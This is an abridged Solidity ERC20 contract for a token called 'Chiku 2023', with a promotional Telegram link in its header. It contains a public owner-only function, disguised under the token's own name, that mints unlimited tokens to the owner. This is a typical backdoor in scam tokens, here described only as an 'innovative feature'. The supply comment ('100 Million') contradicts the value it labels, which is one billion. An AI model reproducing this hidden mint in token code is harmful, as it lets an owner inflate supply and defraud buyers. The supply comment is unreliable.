...
//
// $Chiku2023 proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/Chiku2023
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Chiku2023(uint256 amount) public onlyOwner {
 _Chiku2023(msg.sender, amount);
    }
    ...
    function _Chiku2023(address account, uint256 amount) internal virtual {
...
contract $Chiku2023 is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Chiku 2023", "CHIKU2023") {
     _Chiku2023(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}